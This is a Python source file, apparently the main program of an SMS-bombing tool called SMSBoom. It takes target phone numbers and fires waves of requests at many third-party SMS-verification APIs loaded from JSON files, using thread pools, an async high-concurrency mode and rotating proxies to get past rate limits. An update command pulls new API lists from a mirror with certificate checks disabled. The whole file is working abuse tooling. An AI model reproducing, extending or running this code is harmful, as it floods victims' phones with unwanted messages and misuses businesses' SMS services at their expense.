# encoding=utf8
# 短信测压主程序

from utils import default_header_user_agent
from utils.log import logger
from utils.models import API
from utils.req import reqFunc, reqFuncByProxy, runAsync
from concurrent.futures import ThreadPoolExecutor, wait
from typing import List, Union
import asyncio
import json
import pathlib
import sys
import time
import click
import httpx
import random

# current directory
path = pathlib.Path(__file__).parent


def load_proxies() -> list:
    """load proxies for files
    :return: proxies list
    """
    proxy_data = []
    try:
        proxy_path = pathlib.Path(path, 'http_proxy.txt')
        for line in open(proxy_path):
            le = line.replace("\r", "").replace("\n", "")
            if le == '':
                continue
            proxy_one = {
                'all://': 'http://' + le
            }
            proxy_data.append(proxy_one)
        proxy_path = pathlib.Path(path, 'socks4_proxy.txt')
        for line in open(proxy_path):
            le = line.replace("\r", "").replace("\n", "")
            if le == '':
                continue
            proxy_one = {
                'all://': 'socks4://' + le
            }
            proxy_data.append(proxy_one)
        proxy_path = pathlib.Path(path, 'socks5_proxy.txt')
        for line in open(proxy_path):
            le = line.replace("\r", "").replace("\n", "")
            if le == '':
                continue
            proxy_one = {
                'all://': 'socks5://' + le
            }
            proxy_data.append(proxy_one)
    except:
        logger.error("proxies 加载失败")
        return []
    logger.success(f"proxies 加载完成 接口数:{len(proxy_data)}")
    return proxy_data


def load_json(file: str = 'api.json') -> List[API]:
    """load json for api.json
    :return: api list
    """
    if file == 'api.json':
        json_path = pathlib.Path(path, file)
    else:
        json_path = pathlib.Path(file)

    if not json_path.exists():
        logger.error(f"Json file {json_path} not exists!")
        # return None
        raise ValueError

    with open(json_path.resolve(), mode="r", encoding="utf8") as j:
        try:
            datas = json.loads(j.read())
            APIs = [
                API(**data)
                for data in datas
            ]
            logger.success(f"api.json 加载完成 接口数:{len(APIs)}")
            return APIs
        except Exception as why:
            logger.error(f"Json file syntax error:{why}")
            # return None
            raise ValueError


def load_getapi() -> list:
    """load GETAPI
    :return:
    """
    json_path = pathlib.Path(path, 'GETAPI.json')
    if not json_path.exists():
        logger.error("GETAPI.json file not exists!")
        # return None
        raise ValueError

    with open(json_path.resolve(), mode="r", encoding="utf8") as j:
        try:
            datas = json.loads(j.read())
            logger.success(f"GETAPI加载完成,数目:{len(datas)}")
            return datas
        except Exception as why:
            logger.error(f"Json file syntax error:{why}")
            # return None
            raise ValueError


@click.command()
@click.option("--thread", "-t", help="线程数(默认64)", default=64)
@click.option("--phone", "-p", help="手机号,可传入多个再使用-p传递", prompt=True, required=True, multiple=True)
@click.option('--frequency', "-f", default=1, help="执行轮次(默认1轮)", type=int)
@click.option('--interval', "-i", default=60, help="间隔时间(默认60s)", type=int)
@click.option('--enable_proxy', "-e", is_flag=True, help="开启代理(默认关闭)", type=bool)
@click.option('--api', "-a", default="api.json", help="接口json文件(默认api.json)", type=str)
@click.option('--api-limit', default=0, help="每轮最多测试的接口数(默认0表示文件里的全部接口)", type=int)
@click.option('--api-mode', default='rotate', show_default=True, help="api-limit生效时的取样策略：first=总是取前N条；rotate=按轮次滚动；random=每轮随机抽样", type=click.Choice(['first','rotate','random'], case_sensitive=False))
@click.option('--api-seed', default=None, help="random 模式随机种子(可选)", type=int)
@click.option('--phone-mode',default='serial',show_default=True,help="多手机号策略(同一波次内)：serial=按手机号依次执行并等待完成(更温和/符合限流)；parallel=并行提交(更快，容易触发限流/风控)",type=click.Choice(['parallel','serial'], case_sensitive=False),)
@click.option('--phone-gap', default=0.0, help="serial模式多手机号之间等待秒数", type=float, show_default=True)
@click.option('--wave-wait/--no-wave-wait',default=True,show_default=True,help="每一波等待所有请求完成后再进入下一波(让 --interval 真正生效，减少叠加并发)",)
def run(
    thread: int, phone: Union[str, tuple], frequency: int, interval: int, enable_proxy: bool = False, api: str = "api.json",
    api_limit: int = 0, api_mode: str = "rotate", api_seed: int | None = None,
    phone_mode: str = "serial", phone_gap: float = 0.0, wave_wait: bool = True,
):
    """传入线程数和手机号启动轰炸,支持多手机号"""
    logger.info(f"手机号:{phone}, 线程数:{thread}, 执行次数:{frequency}, 间隔时间:{interval}, 接口文件:{api}, "
        f"每轮接口上限:{api_limit}, 取样:{api_mode}, seed:{api_seed}, 手机号模式:{phone_mode}, phone_gap:{phone_gap}, wave_wait:{wave_wait}"
    )
    with ThreadPoolExecutor(max_workers=thread) as pool:
        # 归一化手机号列表
        phones = [str(p) for p in phone] if isinstance(phone, tuple) else [str(phone)]

        try:
            all_apis = load_json(api)
            if api_seed is not None:
                random.seed(api_seed)
            # _api_get = load_getapi()
            _proxies = load_proxies() if enable_proxy else []
        except ValueError:
            logger.error("读取接口出错!正在重新下载接口数据!....")
            update()
            sys.exit(1)

        if enable_proxy and not _proxies:
            logger.error("已开启代理模式，但未加载到可用代理")
            sys.exit(1)

        for i in range(1, frequency + 1):
            apis_to_test = all_apis
            if api_limit and api_limit > 0 and all_apis:
                limit = min(api_limit, len(all_apis))
                mode = (api_mode or 'first').lower()

                if mode == 'rotate':
                    start = ((i - 1) * limit) % len(all_apis)
                    apis_to_test = all_apis[start: start + limit]
                    if len(apis_to_test) < limit:
                        apis_to_test = apis_to_test + all_apis[:limit - len(apis_to_test)]
                    logger.info(f"第{i}波接口选择: rotate start={start} size={limit}")
                elif mode == 'random':
                    apis_to_test = random.sample(all_apis, k=limit)
                    logger.info(f"第{i}波接口选择: random size={limit}")
                else:
                    apis_to_test = all_apis[:limit]
                    logger.info(f"第{i}波接口选择: first size={limit}")

            # 多手机号下的serial模式
            if len(phones) > 1 and (phone_mode or 'parallel').lower() == 'serial':
                for idx, ph in enumerate(phones, start=1):
                    logger.success(f"第{i}波开始.. (手机号 {idx}/{len(phones)}: {ph})")
                    futures = []
                    if enable_proxy:
                        for proxy in _proxies:
                            logger.success(f"第{i}波 - 当前正在使用代理：{proxy['all://']} (手机号 {ph})")
                            for current_api in apis_to_test:
                                futures.append(pool.submit(reqFuncByProxy, current_api, ph, proxy))
                    else:
                        for current_api in apis_to_test:
                            futures.append(pool.submit(reqFunc, current_api, ph))
                    if wave_wait and futures:
                        wait(futures)
                    if phone_gap and idx < len(phones):
                        logger.info(f"手机号切换等待 {phone_gap}s...")
                        time.sleep(phone_gap)
            else:
                futures = []
                if enable_proxy:
                    for proxy in _proxies:
                        logger.success(f"第{i}波轰炸 - 当前正在使用代理：{proxy['all://']} 进行轰炸...")
                        for current_api in apis_to_test:
                            futures.append(pool.submit(reqFuncByProxy, current_api, phone, proxy))
                else:
                    logger.success(f"第{i}波开始轰炸...")
                    for current_api in apis_to_test:
                        futures.append(pool.submit(reqFunc, current_api, phone))

                if wave_wait and futures:
                    wait(futures)

            if i < frequency:
                logger.success(f"第{i}波轰炸提交结束！休息{interval}s.....")
                time.sleep(interval)
            else:
                logger.success(f"第{i}波轰炸提交结束！")


@click.option("--phone", "-p", help="手机号,可传入多个再使用-p传递", prompt=True, required=True, multiple=True)
@click.option('--api', "-a", default="api.json", help="接口json文件(默认api.json)", type=str)
@click.command()
def asyncRun(phone, api):
    """以最快的方式请求接口(真异步百万并发)"""
    _api = load_json(api)
    _api_get = load_getapi()

    apis: List[Union[API, str]] = [*_api, *_api_get]

    loop = asyncio.get_event_loop()
    loop.run_until_complete(runAsync(apis, phone))


@click.option("--phone", "-p", help="手机号,可传入多个再使用-p传递", prompt=True, required=True, multiple=True)
@click.option('--api', "-a", default="api.json", help="接口json文件(默认api.json)", type=str)
@click.command()
def oneRun(phone, api):
    """单线程(测试使用)"""
    _api = load_json(api)
    _api_get = load_getapi()

    apis: List[Union[API, str]] = [*_api, *_api_get]

    for current_api in apis:
        try:
            reqFunc(current_api, phone)
        except:
            pass


@click.command()
def update():
    """从 github 获取最新接口"""
    GETAPI_json_url = f"https://hk1.monika.love/AdminWhaleFall/SMSBoom/master/GETAPI.json"
    API_json_url = f"https://hk1.monika.love/AdminWhaleFall/SMSBoom/master/api.json"
    logger.info(f"正在从GitHub拉取最新接口!")
    try:
        with httpx.Client(verify=False, timeout=10) as client:
            # print(API_json_url)
            GETAPI_json = client.get(
                GETAPI_json_url, headers=default_header_user_agent()).content.decode(encoding="utf8")
            api_json = client.get(
                API_json_url, headers=default_header_user_agent()).content.decode(encoding="utf8")

    except Exception as why:
        logger.error(f"拉取更新失败:{why}请关闭所有代理软件多尝试几次!")
    else:
        with open(pathlib.Path(path, "GETAPI.json").absolute(), mode="w", encoding="utf8") as a:
            a.write(GETAPI_json)
        with open(pathlib.Path(path, "api.json").absolute(), mode="w", encoding="utf8") as a:
            a.write(api_json)
        logger.success(f"接口更新成功!")


@click.group()
def cli():
    pass


cli.add_command(run)
cli.add_command(update)
cli.add_command(asyncRun)
cli.add_command(oneRun)

if __name__ == "__main__":
    cli()
